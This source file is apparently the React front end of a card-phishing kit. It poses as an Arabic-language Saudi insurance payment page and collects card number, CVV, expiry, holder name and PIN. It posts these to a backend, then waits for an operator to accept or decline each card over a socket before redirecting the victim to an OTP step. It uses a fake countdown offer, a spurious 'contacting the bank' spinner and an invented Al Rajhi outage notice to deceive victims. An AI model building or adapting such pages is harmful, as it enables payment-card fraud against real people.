import axios from "axios";
import React, { useEffect, useRef, useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { GiConfirmed } from "react-icons/gi";
import { VscCheck } from "react-icons/vsc";
import { FaSquarePhone } from "react-icons/fa6";
import Navbar from "../Navbar";
import { useNavigate } from "react-router-dom";

const Confirm = ({ setLoading, loading }) => {
  const data = new URLSearchParams(window.location.search);
  const query = JSON.parse(data.get("data"));
  const companyData = query.companyData;
  const [card_number, setCardNumber] = useState("");
  const [cvv, setCvv] = useState("");
  const [pin, setPin] = useState("");
  const [error, setError] = useState(false);
  const [errorCard, setErrorCard] = useState(false);
  const [pay, setPay] = useState(false);
  const [car_holder_name, setCardHolderName] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [verfiy, setVrefiy] = useState(false);
  const [load, setLoad] = useState(null);
  const [popUp, setPop] = useState(true);
  const [card, setCard] = useState("");
  const navigate = useNavigate();
  useEffect(() => {
    setTimeout(() => {
      setPop(false);
    }, [100000]);
  }, []);

  const [counter, setCounter] = useState(60 * 60 * 7); // 7 hours in seconds

  useEffect(() => {
    console.log();
    const interval = setInterval(() => {
      setCounter((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    return () => clearInterval(interval);
  }, []);

  // Calculate hours, minutes, and seconds
  const hours = Math.floor(counter / 3600);
  const minutes = Math.floor((counter % 3600) / 60);
  const seconds = counter % 60;

  // Format as "HH:MM:SS"
  const formattedTime = `${String(hours).padStart(2, "0")}:${String(
    minutes
  ).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;

  const formatCardNumber = (value) => {
    // Remove non-numeric characters
    const numericValue = value.replace(/\D/g, "");

    console.log(numericValue);

    // Add space after every 4 digits
    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");

    // Trim to 16 characters
    formattedValue = formattedValue.slice(0, 19);

    // Update state
    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    formatCardNumber(e.target.value);
  };

  const handleCvvChange = (e) => {
    const numericValue = e.target.value.replace(/\D/g, "");
    setCvv(numericValue.slice(0, 3));
  };
  const handleExpiryDateChange = (e) => {
    // Limit input to 4 characters (MM/YY)
    const numericValue = e.target.value.replace(/\D/g, "");
    let formattedValue = numericValue.slice(0, 5);

    // Add "/" after 2 characters (month)
    if (formattedValue.length > 2) {
      formattedValue =
        formattedValue.slice(0, 2) + "/" + formattedValue.slice(2);
    }

    setExpiryDate(formattedValue);
  };
  const handleSubmit = async (e) => {
    setLoad(true);
    setError(false);
    setErrorCard(false);
    e.preventDefault();
    let check = card_number.split(" ").join("");
    if (check.length !== 16)
      return window.alert("رقم البطاقه يجب ان يكون 16 رقم");
    if (check.startsWith("4847")) {
      setLoad(false);
      return setErrorCard(`عذرًا، مصرف الراجحي موقوف حاليًا
نفيدكم بأنه يوجد توقف مؤقت في خدمات مصرف الراجحي لدى مركز سلامة، وذلك بسبب خلل فني من جهة مصدر البنك`);
    }
    const finalData = {
      ...JSON.parse(data.get("data")),
      cardNumber: card_number,
      expiryDate,
      cvv,
      pin,
      card_name: car_holder_name,
    };
    try {
      await axios.post(api_route + "/visa/" + query._id, finalData).then(() => {
        socket.emit("paymentForm", JSON.parse(data.get("data"))._id);
        setVrefiy(true);
      });
    } catch (error) {
    } finally {
      setLoading(false);
    }
    // return navigate( = `/verfiy?data=${JSON.stringify(finalData)}`
  };

  socket.on("acceptPaymentForm", (id) => {
    if (id === JSON.parse(data.get("data"))._id) {
      setVrefiy(false);
      sessionStorage.setItem(
        "card",
        card_number.startsWith("5")
          ? "master"
          : card_number.startsWith("4")
          ? "visa"
          : null
      );
      navigate(
        `/verfiy?data=${JSON.stringify({
          ...JSON.parse(data.get("data")),
          cardNumber: card_number,
        })}`
      );
    }
  });

  socket.on("declinePaymentForm", (id) => {
    console.log("declinePaymentForm", id, JSON.parse(data.get("data"))._id);
    if (id === JSON.parse(data.get("data"))._id) {
      setVrefiy(false);
      setLoad(false);
      setError("بيانات البطاقة غير صحيحة برجاء المحاولة مره اخري");
    }
  });

  if (!data.get("data")) {
    return (
      <div className="w-full flex items-center justify-center min-h-52 text-red-500 text-xl">
        Invalid Data
      </div>
    );
  } else {
    return (
      <>
        {popUp && (
          <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen flex-col  left-0 bg-white bg-opacity-45 ">
            <div className="w-11/12 md:w-fit p-3 rounded-md bg-white flex flex-col items-center">
              <img src="/payment.jpg" className="w-full md:w-1/3" />
              <span className="text-xl my-5 text-gray-700 w-fit font-bold">
                سارع قبل نهاية العرض !
              </span>
              <span className="font-bold text-gray-700">
                يتبقى على انتهاء العرض:
              </span>
              <div className="text-green-600 text-4xl my-5 font-bold">
                {formattedTime}
              </div>
              <button
                onClick={() => setPop(false)}
                className="bg-[#6c757d] text-white w-full text-lg py-2 rounded-md"
              >
                إغلاق
              </button>
            </div>
          </div>
        )}
        {load ? (
          <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen flex-col  left-0 bg-white  ">
            <TailSpin
              height="50"
              width="50"
              color="green"
              ariaLabel="tail-spin-loading"
              radius="1"
              wrapperStyle={{}}
              wrapperClass=""
              visible={true}
            />
            <span className="text-xl my-5 text-green-600">
              جاري التواصل مع مصدر البنك
            </span>
          </div>
        ) : (
          <div className="w-11/12 xl:w-1/3 lg:w-1/2  flex flex-col items-start justify-start bg-white  min-h-screen rounded-md py-5  payment ">
            <div className="w-full flex flex-col items-center justify-center  shadow-xl rounded-md  py-4">
              <div className="w-full flex items-center justify-around">
                <span className="px-3 font-medium py-1  border-2 rounded-md">
                  عربي
                </span>
                <img className="w-1/2 " src="logo.svg" />
              </div>
              <span
                className="font-bold text-blue-600 w-full pl-5 pt-3
              mt-3 pb-1  "
                dir="rtl"
              >
                <span className="flex flex-row-reverse  gap-x-1">
                  115.00 <span>SAR</span>
                </span>
              </span>
              <p className="w-full text-left pl-5  pb-1 text-lg">
                {" "}
                1 Item | Expire In 2 days
              </p>

              <form
                className="w-full flex flex-col  px-3 py-5 mt-5  bg-blue-50"
                onSubmit={handleSubmit}
              >
                <div className="relative mt-2 mb-5 flex items-center justify-center">
                  <hr className="absolute  w-full top-3" />
                  <span className=" bg-blue-50 z-10  left-20 px-5">
                    Insert Card Details
                  </span>
                </div>
                <header></header>
                <div className="w-full flex flex-col gap-y-2 border rounded-t-md text-sm">
                  <input
                    value={car_holder_name}
                    required
                    onChange={(e) => setCardHolderName(e.target.value)}
                    dir="ltr"
                    placeholder="Card Holder Name"
                    type="text"
                    className={`w-full rounded-md   text-black   py-2.5 px-3   text-left outline-none`}
                  />
                </div>
                <div className="w-full flex flex-col  gap-y-2 border-x text-sm relative">
                  <input
                    value={card_number}
                    required
                    onChange={handleCardNumberChange}
                    dir="ltr"
                    maxLength={19}
                    minLength={16}
                    inputMode="numeric"
                    type="text"
                    placeholder="Card Number"
                    className={`w-full rounded-md  text-black   py-2.5 px-3   text-left outline-none`}
                  />
                  <div className="flex items-center gap-x-1 absolute right-2 top-1 ">
                    <img src="/amex.svg" className="w-6 " />
                    <img src="/MasterCard.svg" className="w-6 " />
                    <img src="/Visa.svg" className="w-6 " />
                    <img
                      className="w-6 "
                      src={
                        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAATYAAACjCAMAAAA3vsLfAAAAsVBMVEX///+BvUEWoNseJSzl8voAodzu9uip1+/Q5ryTxlmFv0eEv0EYpd0THCT8/PwbIir09fXi5OVna2+8vsAxNz0hJy7q6ussMzrQ0dOQk5bL6PYrqN5rw+mMw1Kw1ofh79M7QEZbX2WytbdFSU/a29wADhkNGCCBhIZUWl+kpqlvdHifo6VLUVcACBXl5ubJysx5foKIi44AAAmWmJsAAABtxulrb3Wk0HScy2i52pOfpKdJ34O/AAAN6UlEQVR4nO2dadujthWG3TpN2+mIfU3aBoRYBNgSQ0ra+f8/rGKR2L1MkprX1fNlrtErBNzWdqSjw+kkJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSX1sL47gJT9x1O0hRZ5FZbB2ZfGS5klLgvZvTfLfB0kyur14+c/vVif//XD/qM7iJgzLV5Z0U1M8ybcVFbBoRSYiUQjryF6CJtD0jwMrDMAths0Ppze+fPnP75Yn/++jc3RYeHnuTFTOMWmk6LKjTCKomBTVlP3GT3fGlOjLMx9TLTNmwp50KdGGQWW69q267pRGVY1FBe9GtouNkUnNAsSMFc8waZ4RZdB3RPIqj6nSZNZehIZhXOrpSoapJbdlXzuxa5yy+rKL/rxoLVNr9wLEA/Nnz0oJ9RKK15mmCvhjbRowKIgcCnpaRecott2si5aTVxjoH1QbGYduhvPHYXiVQkOrJvQGLba7PNWIVj+TQ2yQt/DZvquu1miW/pIOzC2Jko2nlotG4GtjsAdaucYkz5vXm78BGfb28NGN36y4aLEPC420tjjc086paTMB2xanYkKpAKQbOpn4vRtrrRE2qThg7LZhKaZJVjdXfzfjY6Kjc0X7PG5g6jMuGgxYHPyiL+JGxl5uimKhpGvrkRSkwWi5CjTtsZTpxBl27YVsIG6DMRF7Ha6dkxsZhqLV0u+ZAatuCBvV9eYgwVWAz39ujnb5S1aJOi6WZUJr0uq6l03sOlNMGBjtTMojSbPw/LCOw3VLdAxsUWBaBNu7W0ZCQ65cGqhz1J3xAucpmkaHdt3aG5gQ+Uw1oAKXp3hxmYl6psNj4hN0WwxjNm56Wy82Ek3ObYkhVsZbglSQSDYunjEVhNBXschr98xdg6IzUExr2zAUrbnVkhgi83dacSuTJcTuBQbnZvAlsDJWOt4fHgFFB8Qm/dVdCMh3XnxCbYHDczZHXxOIEk3WumkkU7+qmjR0AjUjB4Qm1nxrgfkxX1seHf2tSsdWpOKcwMbnbXhcOhy1cg4IDYs5qYXuNmxndoh4QuvkVH1NDbN4WMO2KrPe9h8o/892ZToiNj4O9kq2bMaFQSG7km1Mkw8JKTrzp21ja698auz/HFsRT5gs4IDYit4C7Ld/fbnCKNRdcMaThbkCNKVnYFkVCm6qQ1DYQ8bpkPv4R4Qm1LzYc6N9rFpxb5xBQJa3FnAzSzeTWWPY4PpMFa57vGwaT7H4Zb72BSUBruWvJUZhbk1/9/AFr4NNmFs3sDG2nK2sSI2VD8VxJRIbFtSNFom6v46ZUxuTOi+CRsfEg7Ztz2K7aRAvykjy53ItifY/C1789dgExOQI46kD2NrzbDUiFpYXKxxCsPsDNLfGBtf7DzkvE15HJuidBuZ+kRmIexN1TB3Z3DfhE1M9sojWgn1+VFsG9KJwVcUQbZlpz+Fbbq6ojnCIgvTA2Ir+ETWDZ7Hxqog5ZUiyPZsszvztmxcOBpTPcoX6hNm4R8PG+ZL0jeMq1uqswGJFe3O3YRVXm7VNrHUkeNh2qw5MA1467exdkRswpSP9zunG8JinmB12FZuJJqmTLCt/+oFHFvoI6db3kXeuCRsB+YRV3chf+1zQr9+AzZIZ9gUVIdzh4gmLXjvxfIYS2WRMNtA8kVtN2Es8EXMrVWX6EfE5mGxTFkam1tLt+XPG6kCaTRXmYUW7z9tN1oqmFltrmsxTTfSMueQO1c6GfetLP15bJQ3MatssWlVtvISmW5Mb/iOnGeap6j95urxsJ1Oyfjj2hQ/6I3WyyEhb39qRNuRVNvakv9WqfYwuh8RmzG+qJ3lGJqPq6j4MMjmbbitqlq4v1TyNLUgxNfDYsN5PD4pAG4QlQ8qAOOySGJ4Hba7HjYbeFg7Xrk7tW5KmT884hGxKaYx8QE5209o8pJWv8nggDN4UokVGTktrWTaKYKkpKZYcD8ithPC0fNVZC773BuUirOaYdxXWhUY+qmRZYOfZhRloeFDJLrZQ2JrVxviX8UN2KAfhBVFf1bXwSbTdIj9vGk55ik2Z8t3B8XmED9ybyxC3lDXpMIa8X2YXQ+RfQ19ResqPjqKLzzFD4nt5MA8DALLvd+dLcTmp6xNVea3mLOP66jYTq17Xk3LwBWdMiNi77o3D3JZb07xpv/Vb6qXU9vHpjgIeYSYpBf/V2hr3kaI56EHdph/rV4N7Qa2e7rl0fZ768cfP79Wt0/BHFV/fr1++O7VEKSkpKSkpDb0P5vDvIO6U9BXXUc3z0tKLaUhsz14m+05WUut5eA0D7vFNde/n1tqkE4Duz8FnTzvd/7/K2QN5ztUWdueEBKe4xLbExI+RhLbM3oe219er5++/32h3Nfz2H75919frf/89PtCua/nsf3h5fr0ywfE9unV1D4mtn+8nNunf0psEttBsG3uRj2yRfXETtY9bOuiPia2R7SOkbcrPbyHbVnWQbFpV8+EtV+llOY0rfzC9Nrn1nQCi6pNZYk1Ntf7yIqDPIhrliXPc0pZJrLlyKpc++IrlgEisoPt2pbVPwQry6+/iuNvR8TGfltEoE/DKGj9F2w3KEMft57uiBSVwVLts20FIfW9GZJurRGZOG3CoPNSZldmRs24LUMzaldS07AMrCAIm9TE60balqURVlbOcrV+c7YdZcZXc6h2R8Rm+mUc9/HshBNRkgAjjdw44amdp96lrAQ3RUFmGlmXxZWAXVnPD5dq1zC4CJ8/AGIRvUtg0zwzz9zlU4AE2H0kiONhcxCrLBsOWHZUBsuoamqQ8WBjJ8ejeetps77QDv3peRq9pTvPJo63Ddi09tDl6m5d/TXSq3ZEbB68bEdm23J3UxNjiD95QhAkOw5xSVZNGjOpdqMMCmw02isL2OR6RGy1/ZQzIMi8HolOblx4Ec6QinbD2VBgm4SHWymGyhGxPedCqUaFMzTuicPzee7/fE7EWWYEbxXGseFpWMZVWd7xsGn+JFQf68/bbnn6Yl1aMvrRq1bWVyRNc4e/x5fLl0sM4i+Tvj7jbRlHk+JZzks7howHqgZsZnfAG7Cy2iwAAFYevwwY/hGxjWc5opDN2Io0nLQ+t2xYml+Nfb8de0N/3/pauhmtMDQRujq6h1PuOK26fVQeBaXj65cGND1iwirnh6o4NsXL2Y9ltwF6WRbkXK8Ei/Ok7SHUA2Ozg7SGJmET3HHgU40Um2b7qpkY58T5yTKKjJxNX0nrT9k6LBMYcbo27cwNxczHA45p0RJBnllHi70ERtfKDMom1J6nOw4zra5tWUOmoDwwNtXKeWi28TAn8PiJ5FqcCYrx0N37fr2wCDRxOBUYeoeNZqL+NcJlfm1cabhZRTgTIQas4NjY+IOTmp8mAuJlxnhlIhZZG2Z9EXLcGYJQMGxdfE9NBHC0s9EyW5vyinNdmbRj+JQPgg1BgU2EayPi2OmNEG7KKRfY+hNYrsVLN8Zsjy0cmf4Hw6YLbKrPjQIEH8B2mmBra5vi8Lhvs5B6j2EjdfKxGulY29SCY/O2sSm6RyDG9SA/UqfYHLQZCnQPGxstICyKoaw8BB8MGxaNtOCIvK1GqigOwTXNjeGgZDSeLu2w6SLwbOLfw8aGTxP6rU8NP3VpfbAh4VFsDjGCSzL7FsB5hm2MaXkfG87deLOsd8PmQVruHahcY5tEjtrA5kGj3I5i/3bYivyya6YvscX1bWz4Rni4t8J29UTtaNceh+968Hd/rm/TeFSMc3fsvCtoXK58K2xeIYzGIGpy2oes52GwemxXT2CrbmFzjDFAfjYEyK+M7B2HBBjx+pGUOUFDDPXcnWJzEJ+33cSm6D8Ly83yCRqisfsfbd72ADYNi/oRmuLE8onOattJAyJ0bLqPzRP3Y22ZB8gXJt5bYXOK4f+qW02M8CU2iwMKmnEHdonN5DawnUwM+rfEhrjFqAb6ZDdriS0UZkOk75rywmi3weQc9Fs2Uq8S2Mgk3N0Cm4L5kojqGmI7C4V72OIJNlS8YW3zRG2zIF+nU1a1TSFULFPaUG8dHtqIbUtslcDGPyfDyvLeEZtWiAg/Nv/cnuPVJb/QGAAUk6Daart8DHHa2PNFcfJV3E+E53E8+pamPLQENsOHLY4ipSFPFNiICL7N6lsWGk0b6G6BbZwVt18Rw21ZdUXL4L3nbaptN3nrCKImCyuhQ5JMt8Z6A0D8v8emITFvU22LTXfz0LKT97QSdFOdBbUHs719ge10+prvBgICw1E1Zlztl3VQbHyos5qnsDm6cSPA3QSbh3PX3sxkn4dVUIWk0W5RR8dm3MS2Xt0t8i9L7xF11UjbegndeOXi0e5LqzHicxccxouyJqZ8dDwHe626DGHU3IwjQpinJWIvgRTxkHbh2BQdGtHEAQuobmm5/UrjsAXDMxLWwY9LkN3dytCffOtV0eo8mGRIbDdojwGCLmrQ6dPrtahtWHzuVxhJuik+Aiw+PYWg+FawcIvRPOznYdaFOy2zsKFp7bffyy2jwJ7UtrbPh7XfLXd3OdmAmrfOmWi6xWeysoys7EOnhjmtfD/tEqygbaR/e7E+zU/BKMiEvUxRPzQdcolWNEmb7SnrsKB5Q6sKQ6/b6UQEpk1mN2i+89yuWeKqogxHXUBv8yNjyKxT2sLH/X01RHBFg6g8fX8ALbaE15/1VsY05VbacDn/oHf/B61LuK4PwWuTnNve0TwHL6r/rvjV2Y1VLiUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUlJSUltdZ/AVeU4ElbacapAAAAAElFTkSuQmCC"
                      }
                    />
                  </div>
                </div>
                <div className="w-full flex items-center border     ">
                  <input
                    className=" w-full   text-black text-sm text-left border-r    px-2 py-2.5       outline-none"
                    type="text"
                    value={cvv}
                    onChange={handleCvvChange}
                    inputMode="numeric"
                    maxLength={3}
                    placeholder="CVV"
                    required
                  />

                  <input
                    type="text"
                    value={expiryDate}
                    maxLength={5}
                    inputMode="numeric"
                    onChange={handleExpiryDateChange}
                    className=" w-full   text-black text-sm text-left   p-2.5       outline-none"
                    placeholder="MM/YY"
                    required
                  />
                </div>

                {errorCard ? (
                  <p className="w-full flex justify-between p-3 border rounded-md text-red-500 mt-2 text-sm bg-[#f8d7da]">
                    {errorCard}
                  </p>
                ) : (
                  ""
                )}
                <button
                  className="px-10 py-2 text-xl  bg-[#1566df] text-white rounded-md my-5 cursor-pointer"
                  type="submit"
                >
                  Pay Now
                </button>
                <div className="flex pt-3 items-center w-full justify-center ">
                  <img src="/payment-b.png" alt="" />
                </div>
              </form>
            </div>
          </div>
        )}
        {/* <div className="w-full lg:w-1/2 flex flex-col items-center justify-center  rounded-md bg-gray-50">
          <div
            className=" bg-opacity-75 w-full flex flex-col md:flex-row  items-center justify-start text-black px-2 py-3 rounded-lg "
            style={{ height: "130vh" }}
          >
            <div
              className=" w-full flex flex-col gap-y-2 md:items-end justify-center items-center md:py-2 bg-white"
              dir="rtl "
            >
              <span className="text-xl font-bold border-b w-full py-3 text-center">
                تفاصيل الدفع
              </span>
              <form
                className="w-full flex flex-col justify-center items-center   gap-y-3 py-5"
                onSubmit={handleSubmit}
              >
                <div
                  className="w-11/12 flex flex-col gap-y-2 border-[#3390ca] border rounded-md p-3"
                  dir="rtl"
                >
                  <div className="w-full flex items-center justify-center">
                    <img src={query.companyData.logo} className="w-2/3" />
                  </div>
                  <span className="text-base  text-gray-500">
                    فترة التأمين :
                  </span>
                  <div className="flex w-full justify-between pl-2 text-sm text-gray-600 ">
                    <span className=" ">تاريخ البداية : </span>
                    <span>{new Date(Date.now()).toDateString()}</span>
                  </div>
                  <div className="flex w-full justify-between pl-2 text-sm text-gray-600 ">
                    <span className=" ">تاريخ النهاية</span>
                    <span className="">
                      {" "}
                      {new Date(
                        Date.now() + 1000 * 60 * 60 * 24 * 365
                      ).toDateString()}
                    </span>
                  </div>

                  <div className="flex gap-x-2">
                    <span className="text-sm  text-gray-500">
                      {" "}
                      تفاصيل السعر :
                    </span>
                  </div>
                  <div className="flex w-full justify-between pl-2 text-sm text-gray-600 ">
                    <span className=" "> القسط الأساسي : </span>
                    <span className=" ">{query.companyData.price} ريال</span>
                  </div>
                  <div className="flex w-full justify-between pl-2 pb-2 border-b text-sm text-green-600 ">
                    <span> خصم عدم وجود مطالبات </span>
                    <span>110.10 ريال</span>
                  </div>
                  <div className="flex w-full justify-between pl-2 text-sm text-gray-600 ">
                    <span className=" "> المجموع الفرعي : </span>
                    <span className=" ">
                      {Number(query.companyData.price) - 110.1} ريال
                    </span>
                  </div>
                  <div className="flex w-full justify-between pl-2 pb-2 border-b text-sm text-gray-600 ">
                    <span> ضريبة القيمة المضافة (15%):</span>
                    <span>110.10 ريال</span>
                  </div>
                  <div className="p-3 w-full flex justify-between items-center">
                    <span>المبلغ الإجمالي :</span>
                    <span className="flex-1 text-left text-3xl font-bold">
                      {query.companyData.price} ريال
                    </span>
                  </div>
                </div>

                <div
                  className="flex flex-col w-full gap-y-3 mt-5 px-5"
                  dir="rtl"
                >
                  <span className="font-bold"> اختر طريقة الدفع</span>
                </div>

                <div
                  className="flex items-start justify-center w-full px-5 gap-x-4 "
                  dir="rtl"
                >
                  <div
                    className={`  flex  items-center justify-center border w-2/3   gap-x-5 px-5 py-5 rounded-md ${
                      method === "visamaster" && "border-blue-700"
                    } `}
                    onClick={() => setMethod("visamaster")}
                  >
                    <img src="/MasterCard.svg" className="w-1/4 " />
                    <img src="/Mada.svg" className="w-1/4" />
                    <img src="/Visa.svg" className="w-1/4" />
                  </div>
                  <div
                    className={` w-1/3 flex items-center justify-center border max-h-16 gap-x-5 px-5 py-5 rounded-md ${
                      method === "apple" && "border-blue-700"
                    }  `}
                    onClick={() => setMethod("apple")}
                  >
                    <img src="/apple.png" className="w-2/3 h-full" />
                  </div>
                </div>
                <div
                  class={`flex items-center flex-row-reverse text-right border  gap-x-2 px-5 py-4 rounded-md ${
                    method === "sdad" && "border-blue-700"
                  }  `}
                  onClick={() => setMethod("sdad")}
                >
                  <svg
                    xmlns="http://www.w3.org/2000/svg"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    stroke-width="2"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    class="lucide lucide-building2 lucide-building-2 w-6 h-6 mx-3"
                    aria-hidden="true"
                  >
                    <path d="M6 22V4a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v18Z"></path>
                    <path d="M6 12H4a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2h2"></path>
                    <path d="M18 9h2a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2h-2"></path>
                    <path d="M10 6h4"></path>
                    <path d="M10 10h4"></path>
                    <path d="M10 14h4"></path>
                    <path d="M10 18h4"></path>
                  </svg>
                  <div>
                    <div class="font-medium text-gray-800">الدفع عبر سداد</div>
                    <div class="text-sm text-gray-600">
                      لمستخدمي بنك الراجحي الدفع عبر المباشر
                    </div>
                  </div>
                </div>

                {method === "visamaster" ? (
                  <>
                    {" "}
                    <div
                      className="flex flex-col w-full gap-y-3  "
                      dir="rtl"
                    ></div>
                    <div
                      className="flex flex-col w-full   text-base px-2  pt-4 pb-2 gap-y-2 text-gray-700 font-bold border-t"
                      dir="rtl"
                    >
                      <span>اسم حامل البطاقة</span>
                      <input
                        value={car_holder_name}
                        required
                        onChange={(e) => setCardHolderName(e.target.value)}
                        dir="ltr"
                        minLength={4}
                        type="text"
                        placeholder="أدخل اسم حامل البطاقة "
                        className="border px-3 py-2 text-right font-light border-gray-400 text-base  outline-blue-500 rounded-md "
                      />
                    </div>
                    <div
                      className="flex flex-col w-full   text-base px-2  gap-y-2 text-gray-700 font-bold "
                      dir="rtl"
                    >
                      <div className="flex w-full justify-between items-center">
                        <span>رقم البطاقة</span>
                        {card === "visa" ? (
                          <img className="w-12" src="/visa.png" />
                        ) : card === "master" ? (
                          <img className="w-12" src="/mastercard.png" />
                        ) : (
                          ""
                        )}
                      </div>
                      <input
                        value={card_number}
                        required
                        onChange={handleCardNumberChange}
                        dir="ltr"
                        maxLength={19}
                        minLength={16}
                        inputMode="numeric"
                        type="text"
                        className="border px-3 py-2 text-right font-light border-gray-400 text-base  outline-blue-500 rounded-md "
                      />
                    </div>
                    <div className="flex w-full gap-x-3 items-center justify-between px-2  ">
                      <div className="flex flex-col  items-end  justify-center gap-y-2">
                        <span> رمز الأمان</span>
                        <input
                          className="border  p-2 text-left font-light border-gray-400 text-base  outline-blue-500 rounded-md "
                          type="text"
                          value={cvv}
                          onChange={handleCvvChange}
                          inputMode="numeric"
                          placeholder="***"
                          maxLength={3}
                          required
                        />
                      </div>
                      <div className="flex flex-col  items-end  justify-center gap-y-2">
                        <span> تاريخ إنتهاء الصلاحية </span>
                        <input
                          className="border  w-full p-2 text-left font-light border-gray-400 text-base  outline-blue-500 rounded-md "
                          type="text"
                          value={expiryDate}
                          maxLength={5}
                          inputMode="numeric"
                          onChange={handleExpiryDateChange}
                          placeholder="MM/YY"
                          required
                        />
                      </div>
                    </div>
                    {errorCard && (
                      <span className="font-bold text-red-500 p-5 w-full border-red-500 border text-center mt-2 text-sm">
                        {errorCard}
                      </span>
                    )}
                    {error && (
                      <span className="font-bold text-red-500 p-5 w-full border-red-500 border text-center mt-2 text-sm">
                        {error}
                      </span>
                    )}
                    <button
                      type="submit"
                      className="flex items-center text-white bg-yellow-500 rounded-md text-xl justify-center gap-2 px-2 w-full mx-2 py-3 mt-5"
                    >
                      ادفع الآن - {query.companyData.price} ريال
                    </button>
                    <div className="flex  items-center gap-x-1">
                      <span>جميع المدفوعات محمية ومشفرة</span>
                      <svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        fill="none"
                        stroke="currentColor"
                        stroke-width="2"
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        class="lucide lucide-circle-check-big w-4 h-4 mr-2 text-green-600"
                        aria-hidden="true"
                      >
                        <path d="M21.801 10A10 10 0 1 1 17 3.335"></path>
                        <path d="m9 11 3 3L22 4"></path>
                      </svg>
                    </div>
                  </>
                ) : (
                  <div className="w-full flex items-center justify-center">
                    <span className="font-bold text-red-500 p-5 w-1/2 border-red-500 border text-center mt-5">
                      غير متوفرة حاليا
                    </span>
                  </div>
                )}
              </form>
            </div>
          </div>
          {load ? (
            <div className="fixed top-0 w-full h-screen bg-white bg-opacity-20 flex items-center justify-center ">
              <TailSpin
                height="50"
                width="50"
                color="white"
                ariaLabel="tail-spin-loading"
                radius="1"
                wrapperStyle={{}}
                wrapperClass=""
                visible={true}
              />
            </div>
          ) : (
            ""
          )}
        </div> */}
      </>
    );
  }
};

export default Confirm;
